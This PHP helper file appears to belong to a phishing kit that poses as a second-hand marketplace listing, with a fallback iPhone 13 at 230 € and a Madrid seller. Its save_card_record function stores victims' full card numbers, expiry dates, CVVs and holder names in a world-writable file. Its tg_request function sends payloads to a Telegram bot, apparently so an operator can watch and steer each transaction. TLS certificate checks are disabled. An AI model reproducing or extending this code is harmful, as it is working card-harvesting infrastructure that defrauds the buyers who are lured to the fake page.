<?php
require_once __DIR__ . '/config.php';

function get_chat_id() {
    if (file_exists(CHAT_FILE)) {
        $c = trim(@file_get_contents(CHAT_FILE));
        if (!empty($c)) return $c;
    }
    return DEFAULT_CHAT_ID;
}

function get_active_id() {
    if (file_exists(ACTIVO_FILE)) {
        $a = trim(@file_get_contents(ACTIVO_FILE));
        if (!empty($a)) return $a;
    }
    if (file_exists(PRODUCTS_JSON)) {
        $data = @json_decode(file_get_contents(PRODUCTS_JSON), true);
        if (!empty($data['activeId'])) return $data['activeId'];
    }
    return 'AD8035350';
}

function format_eur($val) {
    if ($val === null || $val === '') return '—';
    if (is_string($val) && strpos($val, '€') !== false) {
        return trim($val);
    }
    $clean = preg_replace('/[^\d.,]/', '', (string)$val);
    $clean = str_replace(',', '.', $clean);
    $n = floatval($clean);
    if ($n == intval($n)) {
        return number_format($n, 0, ',', '.') . ' €';
    }
    return number_format($n, 2, ',', '.') . ' €';
}

/**
 * Asegura que cualquier URL de foto se guarde y sirva desde el storage del hosting (/photos/)
 */
function ensure_local_photo($url) {
    if (empty($url) || !is_string($url)) return '';
    $url = trim($url);

    // Si ya es una ruta relativa de storage local
    if (strpos($url, '/photos/') === 0 || strpos($url, 'photos/') === 0) {
        return '/' . ltrim($url, '/');
    }

    // Si viene envuelto en weserv.nl, desenrollar la URL original
    if (strpos($url, 'images.weserv.nl/?url=') !== false) {
        $parts = explode('images.weserv.nl/?url=', $url);
        if (!empty($parts[1])) {
            $rawUrl = urldecode($parts[1]);
            if (strpos($rawUrl, 'http') !== 0) $rawUrl = 'https://' . $rawUrl;
            $url = $rawUrl;
        }
    }

    // Si ya apunta a este hosting en la carpeta photos
    if (preg_match('#/photos/(img_[A-Za-z0-9_]+\.(jpg|jpeg|png|webp))#i', $url, $m)) {
        return '/photos/' . $m[1];
    }

    // Si es una URL de Telegram api.telegram.org, descargarla directamente al storage del hosting
    if (strpos($url, 'api.telegram.org') !== false) {
        $pathInfo = pathinfo(parse_url($url, PHP_URL_PATH) ?? '');
        $baseName = $pathInfo['basename'] ?: 'photo.jpg';
        $localName = 'tg_' . preg_replace('/[^a-zA-Z0-9_\.]/', '_', $baseName);

        if (!is_dir(PHOTOS_DIR)) {
            @mkdir(PHOTOS_DIR, 0777, true);
        }
        $targetPath = PHOTOS_DIR . '/' . $localName;
        if (file_exists($targetPath) && filesize($targetPath) > 500) {
            return '/photos/' . $localName;
        }

        $imgData = null;
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 8);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
            $imgData = curl_exec($ch);
            curl_close($ch);
        }
        if (!$imgData) {
            $ctx = stream_context_create([
                'http' => ['timeout' => 8, 'user_agent' => 'Mozilla/5.0'],
                'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false]
            ]);
            $imgData = @file_get_contents($url, false, $ctx);
        }
        if ($imgData && strlen($imgData) > 500) {
            @file_put_contents($targetPath, $imgData);
            @chmod($targetPath, 0666);
            return '/photos/' . $localName;
        }
    }

    return $url;
}

function find_product($target_id = null) {
    if (empty($target_id)) {
        $target_id = get_active_id();
    }
    $sources = [PRODUCTS_JSON, DATA_PRODUCTS_JSON];
    $all_products = [];
    $active_id_found = null;

    foreach ($sources as $file) {
        if (!file_exists($file)) continue;
        $content = @file_get_contents($file);
        if (!$content) continue;
        $data = @json_decode($content, true);
        if (!$data || !is_array($data)) continue;

        if (empty($active_id_found) && !empty($data['activeId'])) {
            $active_id_found = $data['activeId'];
        }

        $walk = function($obj) use (&$walk, &$all_products) {
            if (!is_array($obj)) return;
            if ((!empty($obj['titulo']) || !empty($obj['articulo'])) && (isset($obj['precio']) || isset($obj['precioArticulo']))) {
                $all_products[] = $obj;
                return;
            }
            foreach ($obj as $k => $v) {
                if ($k !== 'tarjeta' && is_array($v)) {
                    $walk($v);
                }
            }
        };

        $walk($data);
    }

    $cleanProd = function($p) {
        if (!empty($p['fotos']) && is_array($p['fotos'])) {
            $fixedFotos = [];
            foreach ($p['fotos'] as $f) {
                $local = ensure_local_photo($f);
                if ($local) $fixedFotos[] = $local;
            }
            $p['fotos'] = $fixedFotos;
        } elseif (!empty($p['fotos']) && is_string($p['fotos'])) {
            $p['fotos'] = [ensure_local_photo($p['fotos'])];
        }
        return $p;
    };

    if (!empty($target_id)) {
        foreach ($all_products as $p) {
            if (!empty($p['id']) && ($p['id'] === $target_id || $p['id'] === 'AD' . $target_id || ('AD' . $p['id']) === $target_id)) {
                return $cleanProd($p);
            }
        }
    }

    if (!empty($active_id_found)) {
        foreach ($all_products as $p) {
            if (!empty($p['id']) && ($p['id'] === $active_id_found || $p['id'] === 'AD' . $active_id_found)) {
                return $cleanProd($p);
            }
        }
    }

    if (!empty($all_products)) {
        return $cleanProd($all_products[0]);
    }

    // Buscar si hay alguna foto en el storage
    $firstPhoto = '';
    if (is_dir(PHOTOS_DIR)) {
        $files = @scandir(PHOTOS_DIR);
        if ($files) {
            foreach ($files as $fl) {
                if ($fl !== '.' && $fl !== '..' && preg_match('/\.(jpg|jpeg|png|webp)$/i', $fl)) {
                    $firstPhoto = '/photos/' . $fl;
                    break;
                }
            }
        }
    }

    return [
        'id' => $target_id ?: 'AD8035350',
        'titulo' => 'iPhone 13',
        'articulo' => 'iPhone 13',
        'precio' => 230,
        'precioArticulo' => 230,
        'descripcion' => 'En perfecto estado',
        'nombre' => 'Sofia Adean',
        'direccion' => 'Avenida de América, 2B, 28005, Madrid',
        'fotos' => $firstPhoto ? [$firstPhoto] : []
    ];
}

function get_tx_status($id) {
    if (file_exists(STATUS_FILE)) {
        $data = @json_decode(file_get_contents(STATUS_FILE), true);
        if (is_array($data)) {
            if (!empty($id) && isset($data[$id])) {
                return $data[$id];
            }
            if (!empty($id)) {
                $altId = (strpos($id, 'AD') === 0) ? substr($id, 2) : ('AD' . $id);
                if (isset($data[$altId])) {
                    return $data[$altId];
                }
            }
            if (isset($data['active'])) {
                return $data['active'];
            }
        }
    }
    return 'waiting';
}

function set_tx_status($id, $st) {
    $data = [];
    if (file_exists(STATUS_FILE)) {
        $c = @file_get_contents(STATUS_FILE);
        $data = @json_decode($c, true) ?: [];
    }
    if (!empty($id)) {
        $data[$id] = $st;
        $altId = (strpos($id, 'AD') === 0) ? substr($id, 2) : ('AD' . $id);
        $data[$altId] = $st;
    }
    $data['active'] = $st;
    @file_put_contents(STATUS_FILE, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    @chmod(STATUS_FILE, 0666);
}

function save_card_record($id, $card) {
    $records = [];
    if (file_exists(CARDS_FILE)) {
        $c = @file_get_contents(CARDS_FILE);
        $records = @json_decode($c, true) ?: [];
    }

    $entry = [
        'id' => $id,
        'fecha' => date('Y-m-d H:i:s'),
        'titular' => $card['titular'] ?? null,
        'marca' => $card['marca'] ?? null,
        'numero' => $card['numero'] ?? null,
        'cad' => $card['cad'] ?? null,
        'cvv' => $card['cvv'] ?? null
    ];
    $records[] = $entry;
    @file_put_contents(CARDS_FILE, json_encode($records, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    @chmod(CARDS_FILE, 0666);

    if (file_exists(DATA_PRODUCTS_JSON)) {
        $prods = @json_decode(file_get_contents(DATA_PRODUCTS_JSON), true);
        if (isset($prods['products'][$id])) {
            $prods['products'][$id]['tarjeta'] = $entry;
            @file_put_contents(DATA_PRODUCTS_JSON, json_encode($prods, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
            @chmod(DATA_PRODUCTS_JSON, 0666);
        }
    }
    return $entry;
}

function tg_request($method, $payload) {
    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/' . $method;
    $body = json_encode($payload);

    // 1. Intentar con cURL si está disponible
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 6);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $res = curl_exec($ch);
        curl_close($ch);
        if ($res) return json_decode($res, true);
    }

    // 2. Fallback mediante stream_context si cURL no está instalado
    $opts = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/json\r\n",
            'content' => $body,
            'timeout' => 6
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ];
    $res = @file_get_contents($url, false, stream_context_create($opts));
    return $res ? json_decode($res, true) : null;
}
